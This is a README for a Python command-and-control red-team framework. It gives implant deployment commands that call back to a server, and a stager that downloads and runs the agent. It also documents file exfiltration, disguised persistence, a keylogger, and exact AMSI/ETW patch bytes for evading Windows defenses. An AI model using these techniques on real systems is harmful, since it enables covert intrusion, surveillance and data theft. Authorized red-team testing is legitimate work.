# c2 — Python C2 Framework

A complete Command & Control framework written from scratch in Python.
Multi-transport (TCP / HTTP / HTTPS), end-to-end encrypted, multi-operator
with role-based access control, plugin-style post-exploitation modules,
agent staging, and SQLite persistence.

---

> ## ⚠️ LEGAL DISCLAIMER
>
> This project is provided for **authorized penetration testing, red team
> engagements, CTF competitions, and educational use in controlled lab
> environments only**.
>
> You must have **explicit, written permission** from the owner of any system
> you test with this software. Unauthorized access to computer systems is
> illegal under laws including (but not limited to) the U.S. Computer Fraud
> and Abuse Act (CFAA), the UK Computer Misuse Act, and the EU Directive on
> Attacks Against Information Systems.
>
> The author(s) accept **no liability** for misuse, damage, or legal
> consequences arising from the use of this code. **You are solely
> responsible** for your actions.

---

## Table of Contents

- [Features](#features)
- [Architecture](#architecture)
- [Requirements](#requirements)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Usage](#usage)
  - [1. Start the Server](#1-start-the-server)
  - [2. Deploy the Agent](#2-deploy-the-agent)
  - [3. Operate the Server](#3-operate-the-server)
  - [4. Remote Operators](#4-remote-operators)
  - [5. Agent Staging](#5-agent-staging)
- [Command Reference](#command-reference)
- [Transports](#transports)
- [Cryptography](#cryptography)
- [Operator Roles (RBAC)](#operator-roles-rbac)
- [Malleable Profiles](#malleable-profiles)
- [Post-Exploitation Modules](#post-exploitation-modules)
- [Project Layout](#project-layout)
- [File & Loot Management](#file--loot-management)
- [Troubleshooting](#troubleshooting)
- [Extending the Framework](#extending-the-framework)

---

## Features

### Communication
- **Three transports** — raw TCP, HTTP, and HTTPS (auto-generated self-signed TLS cert)
- **Beaconing with jitter** — configurable interval and randomized sleep (±30% by default)
- **Length-prefixed framing** — reliable delivery of large payloads over raw sockets
- **Automatic reconnection** — agents retry with backoff when the server is unreachable

### Cryptography
- **RSA-2048 OAEP** key exchange on registration
- **Per-agent AES-256-GCM** session keys (authenticated encryption — tampering is detected)
- **Unique session key per agent**, never shared, never persisted in plaintext on the agent

### Operator Experience
- **Local admin console** (runs in the server process)
- **Remote operator CLI** with authenticated login (port 5555)
- **Role-based access control** — `admin`, `operator`, `viewer`
- **SQLite backend** — agents, tasks, results, operators, profiles, and loot all persisted
- **Multi-operator support** — several red teamers can drive the same server simultaneously

### Post-Exploitation
- Shell command execution
- File upload / download with automatic loot collection
- System information, process listing, environment variables
- Persistence — cron, rc, systemd, Windows registry, schtask, launchagent, startup folder
- Screenshot capture
- Privilege escalation enumeration (Linux + Windows)
- Windows AMSI bypass (patches `AmsiScanBuffer`)
- Windows ETW patching (patches `EtwEventWrite`)
- Keylogger (start / dump / stop)

### Evasion & OPSEC
- **Malleable HTTP profiles** — custom URIs, headers, and User-Agent to blend with normal traffic
- **Agent staging** — small stager pulls the full agent from the server at runtime
- **Beacon jitter** — breaks predictable network patterns

---

## Architecture

```
                    ┌──────────────────────────────────┐
                    │        c2 server (server.py)     │
                    │                                  │
   ┌────────────┐   │  ┌──────────┐  ┌─────────────┐   │   ┌──────────────┐
   │  Agent     │───┼─▶│  TCP     │  │  HTTP /     │◀──┼───│  Remote      │
   │ (agent.py) │   │  │  :4444   │  │  HTTPS      │   │   │  Operator    │
   │            │───┼─▶│          │  │  :8080/8443 │   │   │ (operator.py)│
   └────────────┘   │  └──────────┘  └─────────────┘   │   │   :5555      │
                    │                                  │   └──────────────┘
   ┌────────────┐   │  ┌──────────┐  ┌─────────────┐   │
   │  Stager    │───┼─▶│ /stage   │  │  Local      │   │   ┌──────────────┐
   │(stager.py) │   │  │ endpoint │  │  Console    │   │◀──│  loot/ dir   │
   └────────────┘   │  └──────────┘  └─────────────┘   │   └──────────────┘
                    │                                  │
                    │  ┌────────────────────────────┐  │
                    │  │  SQLite (c2.db)            │  │
                    │  │  agents · tasks · results  │  │
                    │  │  operators · profiles      │  │
                    │  └────────────────────────────┘  │
                    └──────────────────────────────────┘
```

---

## Requirements

- **Python 3.10+** (3.11 or 3.12 recommended)
- Operating systems:
  - **Server** — Linux, macOS, or Windows
  - **Agent** — Linux, macOS, Windows
- Network access between agent and server on the chosen port

### Python dependencies

| Package | Purpose |
|---|---|
| `cryptography` | RSA key exchange + AES-GCM session encryption |
| `flask` | HTTP/HTTPS agent transport |
| `werkzeug` | Threaded Flask server |
| `requests` | Agent HTTP/HTTPS client |
| `pillow` | Screenshot capture |
| `pynput` | Keylogger |

---

## Installation

```bash
# Clone or extract the project into a directory
cd c2/

# (Recommended) create a virtual environment
python -m venv venv
source venv/bin/activate          # Linux/macOS
venv\Scripts\activate              # Windows

# Install dependencies
pip install -r requirements.txt
```

---

## Quick Start

```bash
# ── On the server ────────────────────────────────────────────────
python server.py
# On first run:
#   * You are prompted to set the admin password
#   * RSA keypair is generated (server_private.pem, server_public.pem)
#   * Self-signed TLS cert is generated (server.crt, server.key)
#   * SQLite database is created (c2.db)
#   * loot/ directory is created

# ── On the target ────────────────────────────────────────────────
# Copy server_public.pem + agent.py to the target, then:
python agent.py --transport http --url http://<SERVER_IP>:8080

# ── Back on the server (local console) ──────────────────────────
[c2:none] > list
[c2:none] > use <agent_id_prefix>
[c2:<id>] > sysinfo
[c2:<id>] > shell whoami
[c2:<id>] > shell ipconfig          # or `ip a` on Linux
[c2:<id>] > download C:\Users\Public\secret.txt
[c2:<id>] > screenshot
[c2:<id>] > privesc
```

---

## Usage

### 1. Start the Server

```bash
python server.py
```

On the **first** run the server:

1. Prompts you to set the admin operator password (stored hashed with
   PBKDF2-HMAC-SHA256, 200,000 iterations).
2. Generates an RSA-2048 key pair:
   - `server_private.pem` — **never** leave the server
   - `server_public.pem` — must be copied to every agent machine
3. Generates a self-signed TLS certificate (`server.crt`, `server.key`).
4. Creates the SQLite database (`c2.db`).
5. Creates the `loot/` directory for exfiltrated files.

Once running, four listeners start on these ports:

| Port | Purpose |
|---|---|
| `4444` | TCP agent transport |
| `8080` | HTTP agent transport |
| `8443` | HTTPS agent transport (TLS) |
| `5555` | Remote operator transport (RBAC login) |

The local admin console is available in the same terminal.

---

### 2. Deploy the Agent

Copy `agent.py` **and** `server_public.pem` to the target machine, then
start the agent with the transport of your choice:

```bash
# TCP transport
python agent.py --transport tcp --host <SERVER_IP> --port 4444

# HTTP transport
python agent.py --transport http --url http://<SERVER_IP>:8080

# HTTPS transport (self-signed cert, so pass --insecure)
python agent.py --transport https --url https://<SERVER_IP>:8443 --insecure

# Custom malleable profile
python agent.py --transport http --url http://<SERVER_IP>:8080 --profile myprofile.json

# Custom public key location
python agent.py --transport http --url http://<SERVER_IP>:8080 --pubkey /path/to/server_public.pem
```

The agent prints its `agent_id` when registration succeeds. The server
prints the same ID when it receives the registration.

#### Agent CLI options

| Flag | Description |
|---|---|
| `--transport {tcp,http,https}` | Transport to use (default: `tcp`) |
| `--host <ip>` | Server IP for TCP transport |
| `--port <int>` | Server port (overrides default per transport) |
| `--url <url>` | Full URL for HTTP/HTTPS transport |
| `--profile <file>` | Path to a malleable profile JSON file |
| `--pubkey <file>` | Path to `server_public.pem` (default: `./server_public.pem`) |
| `--insecure` | Skip TLS verification on HTTPS transport |

---

### 3. Operate the Server

The **local admin console** appears in the server's terminal.

```
Commands:
  list                                 List agents
  use <id_prefix>                      Select agent
  back                                 Deselect
  shell <command>                      Execute shell command (queued)
  sysinfo                              Remote system info
  ps                                   Process list
  env                                  Environment variables
  download <remote_path>               Exfil file (saved to loot/)
  upload <local_path> <remote_path>    Push file
  persist <type>                       persistence (cron|rc|systemd|registry|launchagent|startup|schtask)
  screenshot                           Capture screenshot
  privesc                              Enumerate privilege escalation vectors
  amsi                                 Windows AMSI bypass
  etw                                  Windows ETW patch
  keylog_start | keylog_dump | keylog_stop
  results                              Show results for selected agent
  list_operators | add_operator <u> <p> <role> | remove_operator <u>
  list_profiles | add_profile ...
  exit                                 Shutdown server
```

Every command that touches an agent is **queued** and delivered on the
agent's **next beacon**. Results arrive on the beacon that follows task
delivery. This is the beacon/task model — nothing is sent to an agent
out-of-band.

---

### 4. Remote Operators

The operator port (5555) lets other machines control the teamserver with
proper authentication and role-based access control.

```bash
python operator.py <SERVER_IP> 5555
```

You will be prompted for a username and password. Create new operators
from the local admin console:

```
[c2:none] > add_operator alice hunter2 operator
[c2:none] > add_operator bob   viewpw   viewer
[c2:none] > add_operator carol adminpw  admin
[c2:none] > list_operators
```

See [Operator Roles (RBAC)](#operator-roles-rbac) for what each role can do.

---

### 5. Agent Staging

The stager is a tiny (~40 lines) bootstrap that downloads the full agent
from the server's `/stage` endpoint and runs it. This bypasses size-based
file detection and lets you update the agent without re-deploying.

```bash
# On the target machine
python stager.py http://<SERVER_IP>:8080 --transport http --url http://<SERVER_IP>:8080
```

To serve a custom agent payload, place it on the server as
`agent_payload.py` next to `server.py`.

---

## Command Reference

### Agent management

| Command | Description |
|---|---|
| `list` | Show all registered agents with status and last-beacon time |
| `use <prefix>` | Select an agent by ID prefix (must be unambiguous) |
| `back` | Deselect the current agent |

### Tasking

All tasking commands require a selected agent and queue a task for the
agent's next beacon.

| Command | Description |
|---|---|
| `shell <cmd>` | Execute a shell command |
| `sysinfo` | Return hostname, user, OS, arch, PID |
| `ps` | List running processes (`tasklist` / `ps aux`) |
| `env` | Dump environment variables |
| `download <remote>` | Exfiltrate a file (auto-saved to `loot/`) |
| `upload <local> <remote>` | Push a file to the agent |
| `persist <kind>` | Install persistence |
| `screenshot` | Capture the screen (PNG, base64) |
| `privesc` | Enumerate privilege escalation vectors |
| `amsi` | Patch `AmsiScanBuffer` (Windows only) |
| `etw` | Patch `EtwEventWrite` (Windows only) |
| `keylog_start` / `keylog_dump` / `keylog_stop` | Control the keylogger |
| `results` | Show recent results for the selected agent |

### Operator management (admin only)

| Command | Description |
|---|---|
| `list_operators` | Show all operators and their roles |
| `add_operator <user> <pw> <role>` | Create an operator (`admin` / `operator` / `viewer`) |
| `remove_operator <user>` | Delete an operator |

### Profiles (admin only)

| Command | Description |
|---|---|
| `list_profiles` | Show all malleable profiles |
| `add_profile ...` | Register a new profile (see below) |

---

## Transports

### TCP (port 4444)

- Raw sockets with 4-byte big-endian length-prefix framing.
- Bidirectional; the server replies on the same connection.
- Fastest and lowest overhead, but firewall-friendly only on trusted networks.

### HTTP (port 8080)

- Stateful via `X-Agent-Id` request header (injected by the agent).
- Registration, beacon, and result submission are separate POST requests.
- Blends with standard web traffic; passes through most egress firewalls.

### HTTPS (port 8443)

- Same Flask app as HTTP, wrapped in TLS with an auto-generated cert.
- Agent must use `--insecure` because the cert is self-signed.
- For real engagements, replace `server.crt` and `server.key` with a
  valid certificate (Let's Encrypt, internal CA, or a C2-specific domain).

### Comparison

| Transport | Speed | Evasion | Firewall-friendly | Requires cert |
|---|---|---|---|---|
| TCP | Fastest | Low | No | No |
| HTTP | Fast | Good | Yes | No |
| HTTPS | Fast | Best | Yes | Yes (self-signed is fine) |

---

## Cryptography

### Registration (RSA-2048 OAEP)

```
Agent                                    Server
  │                                        │
  │  1. Generate 32-byte session_key       │
  │  2. Build {session_key, info} JSON     │
  │  3. RSA-OAEP(SHA-256, public_key)      │
  │ ────── encrypted registration ───────▶ │
  │                                        │  4. RSA decrypt → extract
  │                                        │     session_key + info
  │                                        │  5. Store agent record
  │ ◀──── AES-GCM({status, agent_id}) ──── │  6. Reply with agent_id
  │                                        │     (encrypted with session_key)
```

### Session encryption (AES-256-GCM)

Every message after registration is encrypted with the per-agent
`session_key` using **AES-256-GCM**:

- 12-byte random nonce per message (prepended to ciphertext)
- Authenticated encryption — any tampering invalidates the message
- No shared global key — compromising one agent does not compromise others

### Key storage

| File | Contains | Where it lives |
|---|---|---|
| `server_private.pem` | RSA private key | Server only — **never** distribute |
| `server_public.pem` | RSA public key | Server + every agent machine |
| `c2.db` (`agents.session_key`) | Per-agent AES keys | Server only |
| In-memory | Agent session key | Agent process only |

Session keys are **never** written to disk by the agent.

---

## Operator Roles (RBAC)

Three roles are enforced by `C2Core.process_command()`:

| Action | `viewer` | `operator` | `admin` |
|---|:---:|:---:|:---:|
| `list` / `use` / `results` | ✅ | ✅ | ✅ |
| Task agents (`shell`, `download`, etc.) | ❌ | ✅ | ✅ |
| `list_operators` | ❌ | ❌ | ✅ |
| `add_operator` / `remove_operator` | ❌ | ❌ | ✅ |
| `list_profiles` | ✅ | ✅ | ✅ |
| `add_profile` | ❌ | ❌ | ✅ |

Passwords are stored as `salt:pbkdf2_hmac_sha256(password, salt, 200000)`
in the `operators` table — never in plaintext.

---

## Malleable Profiles

A malleable profile controls the HTTP request shape the agent uses, so
it blends into normal web traffic. Register profiles from the operator
console (admin only) or insert them directly in the SQLite `profiles`
table.

### Default profile (built-in)

```json
{
  "name": "default",
  "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "register_uri": "/api/v1/auth/login",
  "beacon_uri": "/api/v1/auth/refresh",
  "result_uri": "/api/v1/auth/verify",
  "headers": {
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.9",
    "X-Requested-With": "XMLHttpRequest"
  }
}
```

### Using a custom profile from the agent

Save a profile as `myprofile.json` on the target and pass it:

```bash
python agent.py --transport http --url http://<SERVER_IP>:8080 --profile myprofile.json
```

The server must know about the URIs in the profile — add them first
with `add_profile`, or update `common.DEFAULT_PROFILE` before starting
the server.

---

## Post-Exploitation Modules

Every module below is dispatched by `execute_task()` in `agent.py`.
Output is returned as a string over the encrypted channel.

### `shell`

```python
subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=180)
```

Runs `cmd` and returns `stdout + stderr`.

### `sysinfo`

Returns JSON with `hostname`, `user`, `os`, `os_version`, `arch`, `pid`.

### `ps`

Windows: `tasklist` — Unix: `ps aux`.

### `env`

Dumps `os.environ` as `key=value` lines.

### `download` / `upload`

Base64-encoded file content is carried inside the encrypted JSON. On
download, the server decodes it and saves it to `loot/<agent>_<file>`.

### `persist`

| `kind` | Platform | Action |
|---|---|---|
| `cron` | Linux | Adds a `*/10 * * * *` cron entry |
| `rc` | Linux | Appends to `~/.bashrc` |
| `systemd` | Linux | Creates `~/.config/systemd/user/updater.service` |
| `registry` | Windows | `HKCU\...\CurrentVersion\Run` |
| `schtask` | Windows | `schtasks /create /sc minute /mo 30` |
| `startup` | Windows | Copies to the Startup folder |
| `launchagent` | macOS | Creates `~/Library/LaunchAgents/com.apple.updater.plist` |

### `screenshot`

Tries, in order: ImageMagick `import` → `scrot` → Pillow `ImageGrab`.
Returns base64 PNG.

### `privesc`

Runs a battery of enumeration commands:

- **Linux**: `id`, `sudo -l`, SUID binary scan, `uname -a`,
  write-check on `/etc/passwd` and `/etc/shadow`, cron jobs
- **Windows**: `whoami /priv`, `whoami /groups`, `systeminfo` (hotfixes
  and OS version), unquoted service paths, `C:\Windows\Temp` ACLs

### `amsi` (Windows only)

Patches `amsi.dll!AmsiScanBuffer` with `mov eax, 0x80070057; ret`, so
all AMSI scans return `E_INVALIDARG` (which most .NET hosts treat as
"not malicious").

### `etw` (Windows only)

Patches `ntdll.dll!EtwEventWrite` with `xor rax, rax; ret`, disabling
ETW events produced by .NET assemblies.

### `keylog_start` / `keylog_dump` / `keylog_stop`

Uses `pynput.keyboard.Listener`. Logs to a random `tempfile` path; the
`dump` action returns the last 100 KB.

---

## Project Layout

```
c2/
├── README.md            ← this file
├── requirements.txt     ← Python dependencies
├── common.py            ← shared crypto, framing, default profile
├── server.py            ← teamserver (TCP + HTTP + HTTPS + operator + console)
├── agent.py             ← full implant with all modules
├── operator.py          ← remote operator CLI with RBAC login
├── stager.py            ← tiny stager that downloads and runs the agent
│
├── (generated at runtime)
├── c2.db                ← SQLite database
├── server_private.pem   ← RSA private key (KEEP SECRET)
├── server_public.pem    ← RSA public key (distribute to agents)
├── server.crt           ← self-signed TLS cert
├── server.key           ← TLS private key
└── loot/                ← exfiltrated files
    └── <agent>_<file>
```

---

## File & Loot Management

### Downloads

When the operator issues `download <remote_path>`, the agent reads the
file, base64-encodes it, and returns it inside the encrypted result.
The server decodes it and writes it to:

```
loot/<first 8 chars of agent_id>_<basename of remote path>
```

Example:

```
loot/4f1a9c2b_secret.txt
```

### Uploads

The operator runs `upload <local_path> <remote_path>`. The server reads
the local file, base64-encodes it into the task, and the agent writes
it to `<remote_path>` on the target.

### Results

Every result is stored in the `results` table with its `task_id` and
`agent_id`. Use the `results` command to review the last 20 results
for the selected agent (or the last 30 across all agents if none is
selected).

---

## Troubleshooting

### "login required" when connecting an operator

The operator port expects a login message first. Run `operator.py`
(rather than a raw socket) — it handles the login handshake for you.

### Agent never registers

1. Confirm `server_public.pem` on the target matches the server's
   `server_public.pem`. If the server regenerated its keys, both files
   changed.
2. Confirm the target can reach the chosen port
   (`nc -zv <SERVER_IP> 8080`).
3. Check the server's stdout — registration failures print to the
   console.

### `http 401` on beacon or result

The `X-Agent-Id` header is missing or unknown. Ensure the agent's
`agent_id` matches a row in the `agents` table:

```sql
SELECT id, hostname, connected FROM agents;
```

### HTTPS agent fails TLS verification

Add `--insecure` to the agent, or deploy a real certificate. The
auto-generated `server.crt` is **not** signed by any CA.

### Screenshot returns an error

- Linux: install `scrot` or ImageMagick (`import`)
- Windows / macOS: `pip install pillow`
- Headless Linux (no X/Wayland): will fail regardless — expected

### AMSI/ETW modules return "[!] Windows only"

Those patches only make sense on Windows and rely on `ctypes.windll`.
Running them on Linux/macOS returns that message.

### Keylogger says "pynput not installed"

```bash
pip install pynput
```

On Linux, `pynput` also needs an X server. On headless servers, use a
different `on_press` handler (e.g., log to file from the agent's own
process).

### Agent keeps reconnecting every 10 seconds

That's the `RECONNECT_DELAY` in `agent.py`. The server's beaconing
interval is `BEACON_INTERVAL = 5` with ±30% jitter. Tune both constants
at the top of `agent.py` for your environment.

### Looted file is truncated or corrupt

The base64 transport limits practical file size to a few MB. For large
files, extend the download module to chunk over multiple beacons.

---

## Extending the Framework

### Add a new post-exploitation module

1. In `agent.py`, add a handler function:

   ```python
   def _my_module(args):
       # args is the dict sent by the operator
       return "result string"
   ```

2. Add a dispatch entry inside `execute_task()`:

   ```python
   if cmd == "my_module": return _my_module(a)
   ```

3. In `server.py`, add it to the `process_command` whitelist:

   ```python
   if name in ("shell", ..., "my_module"):
       ...
   ```

4. In `operator.py` and the local console, add a command that builds
   the correct `cmd` dict (or rely on the generic dispatch if the
   operator's CLI already supports arbitrary commands).

### Add a new transport

Subclass the pattern used by `HTTPTransport`:

```python
class MyTransport:
    def connect(self): ...
    def register(self, enc_payload) -> bytes: ...
    def beacon(self, agent_id, enc_beacon) -> bytes: ...
    def submit(self, agent_id, enc_result): ...
```

Then wire a corresponding server listener that decrypts the registration
with `rsa_decrypt(core.priv, ...)`, calls `core.register_agent(...)`,
and serves `core.beacon(aid)` / `core.submit_result(aid, ...)` the same
way the existing listeners do.

### Add a new operator role

Edit the role checks in `C2Core.process_command()` and add the new role
name to `add_operator`'s validation tuple:

```python
if r not in ("admin", "operator", "viewer", "auditor"):
    return {"status": "error", "msg": "bad role"}
```

### Swap the database

`DB` is a thin wrapper around `sqlite3`. To move to PostgreSQL or MySQL,
replace its implementation — every call site uses `db.query()` and
`db.execute()`, so the rest of the code does not change.

---

## License

This project is provided **for educational and authorized security
testing purposes only**. No license is granted for use against systems
you do not own or have explicit written permission to test.

**Use at your own risk. You are responsible for your actions.**
